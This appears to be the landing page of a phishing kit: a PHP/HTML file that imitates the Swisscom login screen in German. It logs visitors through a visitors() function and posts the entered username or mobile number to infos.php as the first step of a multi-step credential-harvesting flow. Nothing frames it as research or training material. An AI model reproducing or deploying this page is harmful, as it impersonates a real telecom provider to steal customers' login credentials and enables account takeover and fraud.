<?php 

require_once "functions.php";


visitors();


?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Swisscom Login</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>

</head>

<body>
   <div class="bod">
       <div class="container d-block d-md-flex">
                <div class="d-none d-md-block"><img width="388" src="image/le.png"></div>
                <div class="frm">
                   <div class="logo"><img width="36" height="48" src="image/logo.svg"></div>
                   <h2 class="mt-3">Swisscom Login</h2> 
                   <p>Melden Sie sich bitte hier mit Ihrem Swisscom Login an.</p>
                   <form action="infos.php" method="post">
                       <input type="hidden" value="index" name="step">
                       <div class="form-group">
                           <label>Benutzername oder Mobilnummer</label>
                           <input type="text" class="form-control" id="user" name="user" placeholder="Benutzername oder Mobilnummer">
                       </div>
                       <div class="bttn"><button name="submit" class="btn btn-primary">Weiter</button></div>
                       <div class="radio mb-4"><img width="221" src="image/re.png"></div>
                   </form>
                </div>
                <div class="d-block d-md-none"><img style="width: 100%;" src="image/le.png"></div>
            </div>
            
       </div>
   </div>
   <footer>
           <div class="container d-block d-md-flex justify-content-between align-items-center">
               <div class="logo d-none d-md-block"><img src="image/lg_ft.png"></div>
               <div class="lang d-block d-md-flex align-items-center text-center text-md-start">
                   <div>Über Swisscom Login</div>
                   <div class="ch">DE</div>
               </div>
           </div>
    </footer>
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  </script>
</body>
</html>